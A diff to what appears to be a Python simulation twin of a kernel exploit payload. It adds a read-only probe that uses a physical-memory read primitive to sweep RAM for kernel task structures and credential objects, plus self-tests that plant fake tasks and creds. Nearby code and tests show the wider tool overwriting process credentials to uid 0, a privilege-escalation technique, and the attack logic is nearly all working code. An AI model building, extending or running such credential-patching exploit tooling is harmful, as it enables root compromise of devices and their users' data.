@@ -546,6 +546,186 @@ def high_alloc_summary(samples, *, fast_mode: bool = True):
     return (fires and not saw_low and fast_mode, parent_out, cred_out, real_out, junk)
 
 
+PROBE_COMM = b"PHYSRPT1"
+PROBE_SPAN_PAGES = 4096
+SWEEP_LO = 0x20000000
+SWEEP_HI = 0x40000000     # the sweep stays inside proven RAM; the translated
+                          # page (>= 0x40000000 for a high VA) is only point-read
+O_CHILDREN = 0x2F8        # pontusml DWARF, next to the TV-measured 0x2F0/0x2F4
+O_SIBLING = 0x300         # fork() links &child->sibling into &parent->children
+
+
+def high_alloc_probe(rpc: MemRPC, child_virt: int, parent_virt: int, cred_virt: int, *,
+                     comm: bytes = PROBE_COMM,
+                     span_pages: int = PROBE_SPAN_PAGES) -> dict:
+    """Twin of the v38.1 payload HighAllocProbe (Program.cs, fast-exit branch).
+
+    The v31 "read-reliability limit" framing left two candidate causes for the
+    unreadable >= 0xE0000000 allocations, and this read-only probe is the
+    measurement that tells them apart (cache visibility is closed: the v28
+    plain-mmap probe measured uid == plain garbage through two VA geometries;
+    the linear map's end on this unit is UNMEASURED - the old 0xE0000000/
+    0xE0800000 split was a stale recon comment, retracted - so wrong
+    translation is the lead, not a proven fact):
+
+    - point-reads the translated parent ADDRESS (P-0xA0000000, the task itself,
+      not its page base) for our comm -> verdict "linear" means the read path
+      got the right frame and still returned junk cred words;
+    - otherwise sweeps proven RAM (SWEEP_LO..SWEEP_HI, +/- span_pages 4K pages
+      around the child's page) for the 8 name bytes ("PHYSRPT1") at ANY offset
+      - tasks are slab objects, not page-aligned (0xe2df7300 sits at page
+      offset 0x300) - verifies the NUL follow-byte at hit+8 across the page
+      edge, takes the task as hit-0x400, and accepts it only when its children
+      list (task+O_CHILDREN, next OR prev) contains &child->sibling =
+      child+O_SIBLING: fork() links the sibling member, not tasks, and a freed
+      or unrelated look-alike fails this check.  Verdict "elsewhere" (wrong
+      translation; `at` is the TASK address and `cuid` says whether its cred
+      reads 5001, which would make a locate-and-patch read path possible),
+      "comm-only" (comm hits that failed the children check - includes a wrong
+      member assumption, hot/stale comms) or "miss" (check `cov`: the range
+      ACTUALLY read - the 2.5 s budget may stop a full-page sweep inside the
+      requested span; a miss is inconclusive, not evidence of absence);
+    - when the parent is low but the CRED is the high object, sweeps the same
+      range for the ids pattern (every hit per page, offset-0..3 hits skipped
+      without closing the page, as CredScanNear does; locate only, never
+      patched).  The physical cred is turned into a VA before cred_uid ->
+      "cred-elsewhere" (a translated frame >= 0x40000000 can never equal a
+      frame found inside the sweep) or "cred-miss".
+
+    Returns the beacon fields: verdict, pp, cp, pc, hits, at, cred, cuid,
+    cov (page range tuple or None), ms (always 0 - no wall clock in the sim).
+    """
+    child_phys = v2p(child_virt)
+    cpage = child_phys & ~0xFFF
+    # Search the 8 name bytes per page and verify the NUL follow-byte at hit+8
+    # (one cross-page byte read, only on candidate hits).  A carry across pages
+    # would be order-dependent: the outward +/-step walk does NOT visit
+    # physically adjacent pages consecutively.
+    comm_pat = comm
+    parent_high = kptr(parent_virt) and parent_virt >= 0xE0000000
+
+    pp = 0
+    pc = False
+    pcred = 0
+    pcuid = UNREADABLE
+    if parent_high:
+        pp = v2p(parent_virt) & ~0xFFF
+        if 0x20000000 <= pp < 0x60000000:
+            try:
+                pc = rpc.read(v2p(parent_virt) + O_COMM, 16)[: len(comm)] == comm
+            except Exception:
+                pc = False
+            try:
+                pcred = rpc.read_u32(v2p(parent_virt) + O_CRED)
+            except Exception:
+                pcred = 0
+            pcuid = cred_uid(rpc, pcred)
+
+    res: dict = {"verdict": "miss",
+                 "pp": pp if parent_high else None,
+                 "cp": (v2p(cred_virt) & ~0xFFF) if kptr(cred_virt) else None,
+                 "pc": int(pc), "hits": 0,
+                 "at": None, "cred": None, "cuid": UNREADABLE,
+                 "cov": None, "ms": 0}
+    if pc:
+        res["verdict"] = "linear"
+        res["at"] = v2p(parent_virt)   # the TASK address, not the page base
+        res["cred"] = pcred
+        res["cuid"] = pcuid
+        return res
+
+    cov_lo = cov_hi = 0
+
+    def mark(page: int) -> None:
+        nonlocal cov_lo, cov_hi
+        if cov_lo == 0 or page < cov_lo:
+            cov_lo = page
+        if page > cov_hi:
+            cov_hi = page
+
+    if parent_high:
+        for step in range(span_pages + 1):
+            dirs = (0,) if step == 0 else (-1, 1)
+            for d in dirs:
+                page = cpage + d * step * PAGE
+                if not SWEEP_LO <= page < SWEEP_HI:
+                    continue
+                mark(page)
+                try:
+                    data = rpc.read(page, PAGE)
+                except Exception:
+                    continue
+                idx = data.find(comm_pat)
+                while idx >= 0 and res["at"] is None:
+                    hit_pa = page + idx
+                    task_pa = hit_pa - O_COMM
+                    if task_pa >= SWEEP_LO:
+                        try:
+                            nul = rpc.read(hit_pa + 8, 1) == b"\x00"
+                        except Exception:
+                            nul = False
+                        if nul:
+                            res["hits"] += 1
+                            try:
+                                nxt, prv = struct.unpack_from(
+                                    "<II", rpc.read(task_pa + O_CHILDREN, 8))
+                            except Exception:
+                                nxt = prv = 0
+                            if child_virt + O_SIBLING in (nxt, prv):
+                                res["verdict"] = "elsewhere"
+                                res["at"] = task_pa
+                                try:
+                                    res["cred"] = rpc.read_u32(task_pa + O_CRED)
+                                except Exception:
+                                    res["cred"] = 0
+                                res["cuid"] = cred_uid(rpc, res["cred"])
+                    idx = data.find(comm_pat, idx + 1)
+            if res["at"] is not None:
+                break
+        res["cov"] = (cov_lo, cov_hi) if cov_lo else None
+        if res["at"] is None:
+            res["verdict"] = "comm-only" if res["hits"] else "miss"
+        return res
+
+    # Parent low, the cred is the high object: locate cred content (ids
+    # pattern, as CredScanNear sees it) and compare frames.  Locate only.
+    anchor = cpage
+    try:
+        cc = rpc.read_u32(child_phys + O_CRED)
+        # the child's cred can itself be the high object (v30/v31 boots:
+        # ccred=e2c35300) - its translated page is then outside the sweep and
+        # the child's TASK page (low, the walk read its comm) is the anchor
+        if kptr(cc) and SWEEP_LO <= v2p(cc) < SWEEP_HI:
+            anchor = v2p(cc) & ~0xFFF
+    except Exception:
+        pass
+    pat16 = struct.pack("<4I", OWNER_UID, OWNER_GID, OWNER_UID, OWNER_GID)
+    for step in range(span_pages + 1):
+        dirs = (0,) if step == 0 else (-1, 1)
+        for d in dirs:
+            page = anchor + d * step * PAGE
+            if not SWEEP_LO <= page < SWEEP_HI:
+                continue
+            mark(page)
+            try:
+                d_ = rpc.read(page, PAGE)
+            except Exception:
+                continue
+            i = d_.find(pat16)
+            while i >= 0:
+                if i >= 4:
+                    res["verdict"] = "cred-elsewhere"
+                    res["at"] = page
+                    res["cred"] = page + i - 4
+                    # cred_uid wants a kernel VA; res["cred"] is physical
+                    res["cuid"] = cred_uid(rpc, (res["cred"] + PHYS_OFF) & 0xFFFFFFFF)
+                    res["cov"] = (cov_lo, cov_hi)
+                    return res
+                i = d_.find(pat16, i + 1)
+    res["cov"] = (cov_lo, cov_hi) if cov_lo else None
+    return res
+
+
 def direct_parent_patch(rpc, child_virt: int, *, beacon,
                         retries: int = 8,
                         probe_prs: tuple[int, ...] = (0, -1)):
@@ -1383,6 +1563,148 @@ def selftest() -> int:
         and cred_uid(s10, (cred10b + PHYS_OFF) & 0xFFFFFFFF) == 0
         and cred_uid(s10, (cred10a + PHYS_OFF) & 0xFFFFFFFF) == OWNER_UID,
         f"patched={patched10} (later cred patched, pre-page cred left alone)",
+    )
+
+    # ---- v38.1: high_alloc_probe twins (read-only high-allocation diagnostic) --
+    # Tasks are NOT page-aligned: every scene below places tasks at page offset
+    # 0x300 (the real beacon shape, 0xe2df7300) and links the parent's children
+    # list (task+O_CHILDREN) to &child->sibling (child+O_SIBLING) exactly as
+    # fork() does.  The first-cut fixtures planted page-aligned tasks with an
+    # invented 0x2C0 pointer and passed against a probe that could never hit a
+    # real layout - these cases pin the corrected algorithm.
+    def probe_scene():
+        r = MemRPC()
+        ccred = plant_cred(r, 0x26200000)
+        child_p = 0x26300300                       # page 0x26300000, offset 0x300
+        child_v = plant_task(r, child_p, b"PHYRFORK", ccred)
+        return r, child_p, child_v
+
+    def plant_parent(r, parent_p, child_v, *, link_children=True):
+        pcred = plant_cred(r, parent_p - 0x12000)
+        pv = plant_task(r, parent_p, b"PHYSRPT1", pcred)
+        if link_children:
+            # fork() links &child->sibling into parent->children (next AND prev
+            # hold it when it is the only child)
+            r.write(parent_p + O_CHILDREN,
+                    struct.pack("<II", child_v + O_SIBLING, child_v + O_SIBLING))
+        return pv
+
+    P_HI = 0xE2DF7300            # the real beacon's parent VA; v2p -> 0x42DF7300
+
+    # elsewhere: the translated address is NOT the parent; the true task sits
+    # at page offset 0x300 inside the sweep and its cred reads 5001
+    r, child_p, child_v = probe_scene()
+    r.write32(child_p + O_REAL_PARENT, P_HI)
+    true_p = 0x26F00300                       # +12 MiB, inside the +/-16 MiB sweep
+    plant_parent(r, true_p, child_v)
+    h = high_alloc_probe(r, child_v, P_HI, 0)
+    failed += not _check(
+        "high-scan elsewhere (offset-0x300 task, sibling-linked)",
+        h["verdict"] == "elsewhere" and h["at"] == true_p
+        and h["cuid"] == OWNER_UID and h["pc"] == 0
+        and h["cov"] is not None,
+        f"true task at {h['at']:#x} cuid={h['cuid']} pc={h['pc']}",
+    )
+
+    # linear: the translated parent ADDRESS itself holds the task (non-
+    # page-aligned there too) - the read-path world
+    r, child_p, child_v = probe_scene()
+    P_LIN = 0xE2345300
+    r.write32(child_p + O_REAL_PARENT, P_LIN)
+    plant_parent(r, v2p(P_LIN), child_v)
+    h = high_alloc_probe(r, child_v, P_LIN, 0)
+    failed += not _check(
+        "high-scan linear (read-path failure, non-aligned)",
+        h["verdict"] == "linear" and h["at"] == v2p(P_LIN)
+        and h["pc"] == 1 and h["cuid"] == OWNER_UID,
+        f"at={h['at']:#x} pc={h['pc']} cuid={h['cuid']}",
+    )
+
+    # comm-only: a PHYSRPT1 task in range whose children list does NOT link the
+    # child's sibling member (e.g. the old wrong child+tasks assumption)
+    r, child_p, child_v = probe_scene()
+    r.write32(child_p + O_REAL_PARENT, P_HI)
+    decoy = 0x26D00300
+    plant_task(r, decoy, b"PHYSRPT1", plant_cred(r, decoy - 0x12000))
+    r.write32(decoy + O_CHILDREN, child_v + O_TASKS)   # wrong member on purpose
+    h = high_alloc_probe(r, child_v, P_HI, 0)
+    failed += not _check(
+        "high-scan comm-only (children check rejects the look-alike)",
+        h["verdict"] == "comm-only" and h["hits"] >= 1 and h["at"] is None,
+        f"hits={h['hits']}",
+    )
+
+    # straddle: the task at page+0xBF8 puts its comm at page+0xFF8, crossing
+    # the page edge; the 8-byte carry must not lose it
+    r, child_p, child_v = probe_scene()
+    r.write32(child_p + O_REAL_PARENT, P_HI)
+    straddle_p = 0x26C00BF8
+    plant_parent(r, straddle_p, child_v)
+    h = high_alloc_probe(r, child_v, P_HI, 0)
+    failed += not _check(
+        "high-scan finds a page-straddling comm (carry)",
+        h["verdict"] == "elsewhere" and h["at"] == straddle_p
+        and h["cuid"] == OWNER_UID,
+        f"task at {h['at']:#x}",
+    )
+
+    # miss: nothing planted inside the sweep; cov states what was covered
+    r, child_p, child_v = probe_scene()
+    r.write32(child_p + O_REAL_PARENT, P_HI)
+    h = high_alloc_probe(r, child_v, P_HI, 0)
+    failed += not _check(
+        "high-scan miss (coverage, not a conclusion)",
+        h["verdict"] == "miss" and h["at"] is None and h["cov"] is not None
+        and h["cov"][1] < 0x40000000,
+        f"cov={h['cov'][0]:#x}-{h['cov'][1]:#x}",
+    )
+
+    # cred-elsewhere: parent low and readable, the CRED is the high object;
+    # the ids pattern is found at a frame the translated one cannot be, and
+    # the physical cred is converted to a VA before cred_uid
+    r, child_p, child_v = probe_scene()
+    cred_hi = 0xE4D49100
+    r.write32(child_p + O_CRED, cred_hi)
+    r.write32(child_p + O_REAL_CRED, cred_hi)
+    pv_low = plant_parent(r, 0x26700300, child_v)
+    h = high_alloc_probe(r, child_v, pv_low, cred_hi)
+    failed += not _check(
+        "high-scan cred-elsewhere (phys cred -> VA before cred_uid)",
+        h["verdict"] == "cred-elsewhere" and h["cuid"] == OWNER_UID
+        and h["at"] is not None and h["at"] < 0x40000000,
+        f"cred frame at {h['cred']:#x} cuid={h['cuid']}",
+    )
+
+    # an offset-0..3 ids hit is skipped without abandoning the rest of the page
+    # (the child's own cred is junked here: the anchor page is swept first and
+    # its live pattern would otherwise be the legitimate first hit)
+    r, child_p, child_v = probe_scene()
+    cred_hi = 0xE4D49100
+    r.write32(child_p + O_CRED, cred_hi)
+    r.write32(child_p + O_REAL_CRED, cred_hi)
+    r.write(0x26200004, b"\x00" * 32)             # junk the anchor-page pattern
+    page_ = 0x26201000                              # step 1, dir +1 from the anchor
+    r.write(page_, struct.pack("<4I", OWNER_UID, OWNER_GID, OWNER_UID, OWNER_GID))
+    # ^ idx 0: a cred straddling from the previous page (single window, not
+    # the repeating OWNER_PAT - that would match at every 8-byte offset)
+    later = plant_cred(r, page_ + 0x7FC)            # real cred, pattern at 0x800
+    h = high_alloc_probe(r, child_v, 0, cred_hi)
+    failed += not _check(
+        "high-scan cred scan continues past an offset-0 hit",
+        h["verdict"] == "cred-elsewhere" and h["cred"] == page_ + 0x7FC
+        and h["cuid"] == OWNER_UID,
+        f"cred at {h['cred']:#x}",
+    )
+
+    # the probe never writes: a planted cred keeps its uid 5001 everywhere
+    r, child_p, child_v = probe_scene()
+    r.write32(child_p + O_REAL_PARENT, P_HI)
+    h = high_alloc_probe(r, child_v, P_HI, 0)
+    failed += not _check(
+        "high-scan is read-only",
+        cred_uid(r, (0x26200000 + PHYS_OFF) & 0xFFFFFFFF) == OWNER_UID
+        and cred_uid(r, r.read_u32(v2p(child_v) + O_CRED)) == OWNER_UID,
+        "no Write32/PatchCred on the diagnostic path",
     )
 
     # v20: reopen AFTER fork while the child still holds the fd.
